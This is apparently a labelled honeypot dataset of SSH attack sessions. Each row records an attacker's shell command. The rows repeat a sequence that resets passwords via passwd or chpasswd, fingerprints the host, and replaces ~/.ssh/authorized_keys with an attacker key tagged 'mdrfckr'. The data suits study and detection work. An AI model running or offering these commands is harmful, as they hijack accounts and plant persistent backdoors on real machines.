Unnamed: 0;session;duration;command_freq;input;attack_cat;label_nr;label_desc
8453;b05b0105369a;1,25796E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
8454;b05b0105369a;1,25796E+16;18;"echo -e ""etc\n6sOwJMRQKScN\n6sOwJMRQKScN""|passwd|bash";Malicious activity;1;SSH attack
8455;b05b0105369a;1,25796E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
8456;b05b0105369a;1,25796E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
8457;b05b0105369a;1,25796E+16;18;"echo ""etc\n6sOwJMRQKScN\n6sOwJMRQKScN\n""|passwd";Malicious activity;1;SSH attack
8458;b05b0105369a;1,25796E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
8459;b05b0105369a;1,25796E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
8460;b05b0105369a;1,25796E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
8461;b05b0105369a;1,25796E+16;18;which ls;Malicious activity;1;SSH attack
8462;b05b0105369a;1,25796E+16;18;crontab -l;Malicious activity;1;SSH attack
8463;b05b0105369a;1,25796E+16;18;w;Malicious activity;1;SSH attack
8464;b05b0105369a;1,25796E+16;18;uname -m;Malicious activity;1;SSH attack
8465;b05b0105369a;1,25796E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
8466;b05b0105369a;1,25796E+16;18;top;Malicious activity;1;SSH attack
8467;b05b0105369a;1,25796E+16;18;uname;Malicious activity;1;SSH attack
8468;b05b0105369a;1,25796E+16;18;uname -a;Malicious activity;1;SSH attack
8469;b05b0105369a;1,25796E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
8470;b05b0105369a;1,25796E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
11375;f54c9b0c77b2;1,2633E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
11376;f54c9b0c77b2;1,2633E+16;15;"echo ""root:BzO7pPjGV55j""|chpasswd|bash";Malicious activity;1;SSH attack
11377;f54c9b0c77b2;1,2633E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
11378;f54c9b0c77b2;1,2633E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
11379;f54c9b0c77b2;1,2633E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
11380;f54c9b0c77b2;1,2633E+16;15;which ls;Malicious activity;1;SSH attack
11381;f54c9b0c77b2;1,2633E+16;15;crontab -l;Malicious activity;1;SSH attack
11382;f54c9b0c77b2;1,2633E+16;15;w;Malicious activity;1;SSH attack
11383;f54c9b0c77b2;1,2633E+16;15;uname -m;Malicious activity;1;SSH attack
11384;f54c9b0c77b2;1,2633E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
11385;f54c9b0c77b2;1,2633E+16;15;top;Malicious activity;1;SSH attack
11386;f54c9b0c77b2;1,2633E+16;15;uname;Malicious activity;1;SSH attack
11387;f54c9b0c77b2;1,2633E+16;15;uname -a;Malicious activity;1;SSH attack
11388;f54c9b0c77b2;1,2633E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
11389;f54c9b0c77b2;1,2633E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
13797;1d16f48f5411;1,26462E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
13798;1d16f48f5411;1,26462E+16;18;"echo -e ""com123\nNieZdBFvprO1\nNieZdBFvprO1""|passwd|bash";Malicious activity;1;SSH attack
13799;1d16f48f5411;1,26462E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
13800;1d16f48f5411;1,26462E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
13801;1d16f48f5411;1,26462E+16;18;"echo ""com123\nNieZdBFvprO1\nNieZdBFvprO1\n""|passwd";Malicious activity;1;SSH attack
13802;1d16f48f5411;1,26462E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
13803;1d16f48f5411;1,26462E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
13804;1d16f48f5411;1,26462E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
13805;1d16f48f5411;1,26462E+16;18;which ls;Malicious activity;1;SSH attack
13806;1d16f48f5411;1,26462E+16;18;crontab -l;Malicious activity;1;SSH attack
13807;1d16f48f5411;1,26462E+16;18;w;Malicious activity;1;SSH attack
13808;1d16f48f5411;1,26462E+16;18;uname -m;Malicious activity;1;SSH attack
13809;1d16f48f5411;1,26462E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
13810;1d16f48f5411;1,26462E+16;18;top;Malicious activity;1;SSH attack
13811;1d16f48f5411;1,26462E+16;18;uname;Malicious activity;1;SSH attack
13812;1d16f48f5411;1,26462E+16;18;uname -a;Malicious activity;1;SSH attack
13813;1d16f48f5411;1,26462E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
13814;1d16f48f5411;1,26462E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
13869;6f7eb3654ec3;1,26603E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
13870;6f7eb3654ec3;1,26603E+16;18;"echo -e ""tang\nffdTlUdLm7x1\nffdTlUdLm7x1""|passwd|bash";Malicious activity;1;SSH attack
13871;6f7eb3654ec3;1,26603E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
13872;6f7eb3654ec3;1,26603E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
13873;6f7eb3654ec3;1,26603E+16;18;"echo ""tang\nffdTlUdLm7x1\nffdTlUdLm7x1\n""|passwd";Malicious activity;1;SSH attack
13874;6f7eb3654ec3;1,26603E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
13875;6f7eb3654ec3;1,26603E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
13876;6f7eb3654ec3;1,26603E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
13877;6f7eb3654ec3;1,26603E+16;18;which ls;Malicious activity;1;SSH attack
13878;6f7eb3654ec3;1,26603E+16;18;crontab -l;Malicious activity;1;SSH attack
13879;6f7eb3654ec3;1,26603E+16;18;w;Malicious activity;1;SSH attack
13880;6f7eb3654ec3;1,26603E+16;18;uname -m;Malicious activity;1;SSH attack
13881;6f7eb3654ec3;1,26603E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
13882;6f7eb3654ec3;1,26603E+16;18;top;Malicious activity;1;SSH attack
13883;6f7eb3654ec3;1,26603E+16;18;uname;Malicious activity;1;SSH attack
13884;6f7eb3654ec3;1,26603E+16;18;uname -a;Malicious activity;1;SSH attack
13885;6f7eb3654ec3;1,26603E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
13886;6f7eb3654ec3;1,26603E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
1669;fe7963fcf297;1,27218E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
1670;fe7963fcf297;1,27218E+16;18;"echo -e ""hero\nPiLK9I50Fouo\nPiLK9I50Fouo""|passwd|bash";Malicious activity;1;SSH attack
1671;fe7963fcf297;1,27218E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
1672;fe7963fcf297;1,27218E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
1673;fe7963fcf297;1,27218E+16;18;"echo ""hero\nPiLK9I50Fouo\nPiLK9I50Fouo\n""|passwd";Malicious activity;1;SSH attack
1674;fe7963fcf297;1,27218E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
1675;fe7963fcf297;1,27218E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
1676;fe7963fcf297;1,27218E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
1677;fe7963fcf297;1,27218E+16;18;which ls;Malicious activity;1;SSH attack
1678;fe7963fcf297;1,27218E+16;18;crontab -l;Malicious activity;1;SSH attack
1679;fe7963fcf297;1,27218E+16;18;w;Malicious activity;1;SSH attack
1680;fe7963fcf297;1,27218E+16;18;uname -m;Malicious activity;1;SSH attack
1681;fe7963fcf297;1,27218E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
1682;fe7963fcf297;1,27218E+16;18;top;Malicious activity;1;SSH attack
1683;fe7963fcf297;1,27218E+16;18;uname;Malicious activity;1;SSH attack
1684;fe7963fcf297;1,27218E+16;18;uname -a;Malicious activity;1;SSH attack
1685;fe7963fcf297;1,27218E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
1686;fe7963fcf297;1,27218E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
10134;ddc76f0946b0;1,27223E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
10135;ddc76f0946b0;1,27223E+16;15;"echo ""root:A3FHvXwOopMc""|chpasswd|bash";Malicious activity;1;SSH attack
10136;ddc76f0946b0;1,27223E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
10137;ddc76f0946b0;1,27223E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
10138;ddc76f0946b0;1,27223E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
10139;ddc76f0946b0;1,27223E+16;15;which ls;Malicious activity;1;SSH attack
10140;ddc76f0946b0;1,27223E+16;15;crontab -l;Malicious activity;1;SSH attack
10141;ddc76f0946b0;1,27223E+16;15;w;Malicious activity;1;SSH attack
10142;ddc76f0946b0;1,27223E+16;15;uname -m;Malicious activity;1;SSH attack
10143;ddc76f0946b0;1,27223E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
10144;ddc76f0946b0;1,27223E+16;15;top;Malicious activity;1;SSH attack
10145;ddc76f0946b0;1,27223E+16;15;uname;Malicious activity;1;SSH attack
10146;ddc76f0946b0;1,27223E+16;15;uname -a;Malicious activity;1;SSH attack
10147;ddc76f0946b0;1,27223E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
10148;ddc76f0946b0;1,27223E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
4408;f01f850367a7;1,27231E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
4409;f01f850367a7;1,27231E+16;18;"echo -e ""abc1234\nCDpqtvtibCpJ\nCDpqtvtibCpJ""|passwd|bash";Malicious activity;1;SSH attack
4410;f01f850367a7;1,27231E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
4411;f01f850367a7;1,27231E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
4412;f01f850367a7;1,27231E+16;18;"echo ""abc1234\nCDpqtvtibCpJ\nCDpqtvtibCpJ\n""|passwd";Malicious activity;1;SSH attack
4413;f01f850367a7;1,27231E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
4414;f01f850367a7;1,27231E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
4415;f01f850367a7;1,27231E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
4416;f01f850367a7;1,27231E+16;18;which ls;Malicious activity;1;SSH attack
4417;f01f850367a7;1,27231E+16;18;crontab -l;Malicious activity;1;SSH attack
4418;f01f850367a7;1,27231E+16;18;w;Malicious activity;1;SSH attack
4419;f01f850367a7;1,27231E+16;18;uname -m;Malicious activity;1;SSH attack
4420;f01f850367a7;1,27231E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
4421;f01f850367a7;1,27231E+16;18;top;Malicious activity;1;SSH attack
4422;f01f850367a7;1,27231E+16;18;uname;Malicious activity;1;SSH attack
4423;f01f850367a7;1,27231E+16;18;uname -a;Malicious activity;1;SSH attack
4424;f01f850367a7;1,27231E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
4425;f01f850367a7;1,27231E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
8597;a41d08f8c85c;1,27448E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
8598;a41d08f8c85c;1,27448E+16;18;"echo -e ""123\neC47gjdMCigk\neC47gjdMCigk""|passwd|bash";Malicious activity;1;SSH attack
8599;a41d08f8c85c;1,27448E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
8600;a41d08f8c85c;1,27448E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
8601;a41d08f8c85c;1,27448E+16;18;"echo ""123\neC47gjdMCigk\neC47gjdMCigk\n""|passwd";Malicious activity;1;SSH attack
8602;a41d08f8c85c;1,27448E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
8603;a41d08f8c85c;1,27448E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
8604;a41d08f8c85c;1,27448E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
8605;a41d08f8c85c;1,27448E+16;18;which ls;Malicious activity;1;SSH attack
8606;a41d08f8c85c;1,27448E+16;18;crontab -l;Malicious activity;1;SSH attack
8607;a41d08f8c85c;1,27448E+16;18;w;Malicious activity;1;SSH attack
8608;a41d08f8c85c;1,27448E+16;18;uname -m;Malicious activity;1;SSH attack
8609;a41d08f8c85c;1,27448E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
8610;a41d08f8c85c;1,27448E+16;18;top;Malicious activity;1;SSH attack
8611;a41d08f8c85c;1,27448E+16;18;uname;Malicious activity;1;SSH attack
8612;a41d08f8c85c;1,27448E+16;18;uname -a;Malicious activity;1;SSH attack
8613;a41d08f8c85c;1,27448E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
8614;a41d08f8c85c;1,27448E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
8741;062733fb8de3;1,27507E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
8742;062733fb8de3;1,27507E+16;18;"echo -e ""qzb\n0UVKyRfZCqaj\n0UVKyRfZCqaj""|passwd|bash";Malicious activity;1;SSH attack
8743;062733fb8de3;1,27507E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
8744;062733fb8de3;1,27507E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
8745;062733fb8de3;1,27507E+16;18;"echo ""qzb\n0UVKyRfZCqaj\n0UVKyRfZCqaj\n""|passwd";Malicious activity;1;SSH attack
8746;062733fb8de3;1,27507E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
8747;062733fb8de3;1,27507E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
8748;062733fb8de3;1,27507E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
8749;062733fb8de3;1,27507E+16;18;which ls;Malicious activity;1;SSH attack
8750;062733fb8de3;1,27507E+16;18;crontab -l;Malicious activity;1;SSH attack
8751;062733fb8de3;1,27507E+16;18;w;Malicious activity;1;SSH attack
8752;062733fb8de3;1,27507E+16;18;uname -m;Malicious activity;1;SSH attack
8753;062733fb8de3;1,27507E+16;18;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
8754;062733fb8de3;1,27507E+16;18;top;Malicious activity;1;SSH attack
8755;062733fb8de3;1,27507E+16;18;uname;Malicious activity;1;SSH attack
8756;062733fb8de3;1,27507E+16;18;uname -a;Malicious activity;1;SSH attack
8757;062733fb8de3;1,27507E+16;18;lscpu | grep Model;Malicious activity;1;SSH attack
8758;062733fb8de3;1,27507E+16;18;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
2022;f500949673fc;1,27863E+16;15;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
2023;f500949673fc;1,27863E+16;15;"echo ""root:kucRZf947dEg""|chpasswd|bash";Malicious activity;1;SSH attack
2024;f500949673fc;1,27863E+16;15;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
2025;f500949673fc;1,27863E+16;15;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
2026;f500949673fc;1,27863E+16;15;ls -lh $(which ls);Malicious activity;1;SSH attack
2027;f500949673fc;1,27863E+16;15;which ls;Malicious activity;1;SSH attack
2028;f500949673fc;1,27863E+16;15;crontab -l;Malicious activity;1;SSH attack
2029;f500949673fc;1,27863E+16;15;w;Malicious activity;1;SSH attack
2030;f500949673fc;1,27863E+16;15;uname -m;Malicious activity;1;SSH attack
2031;f500949673fc;1,27863E+16;15;cat /proc/cpuinfo | grep model | grep name | wc -l;Malicious activity;1;SSH attack
2032;f500949673fc;1,27863E+16;15;top;Malicious activity;1;SSH attack
2033;f500949673fc;1,27863E+16;15;uname;Malicious activity;1;SSH attack
2034;f500949673fc;1,27863E+16;15;uname -a;Malicious activity;1;SSH attack
2035;f500949673fc;1,27863E+16;15;lscpu | grep Model;Malicious activity;1;SSH attack
2036;f500949673fc;1,27863E+16;15;"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~";Malicious activity;1;SSH attack
14211;91b2c45655f8;1,28532E+16;18;cat /proc/cpuinfo | grep name | wc -l;Malicious activity;1;SSH attack
14212;91b2c45655f8;1,28532E+16;18;"echo -e ""lily\noubXnloHHbUE\noubXnloHHbUE""|passwd|bash";Malicious activity;1;SSH attack
14213;91b2c45655f8;1,28532E+16;18;Enter new UNIX password: ;Malicious activity;1;SSH attack
14214;91b2c45655f8;1,28532E+16;18;Enter new UNIX password:;Malicious activity;1;SSH attack
14215;91b2c45655f8;1,28532E+16;18;"echo ""lily\noubXnloHHbUE\noubXnloHHbUE\n""|passwd";Malicious activity;1;SSH attack
14216;91b2c45655f8;1,28532E+16;18;"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'";Malicious activity;1;SSH attack
14217;91b2c45655f8;1,28532E+16;18;free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}';Malicious activity;1;SSH attack
14218;91b2c45655f8;1,28532E+16;18;ls -lh $(which ls);Malicious activity;1;SSH attack
14219;91b2c45655f8;1,28532E+16;18;which ls;Malicious activity;1;SSH attack
14220;91b2c45655f8;1,28532E+16;18;crontab -l;Malicious activity;1;SSH attack
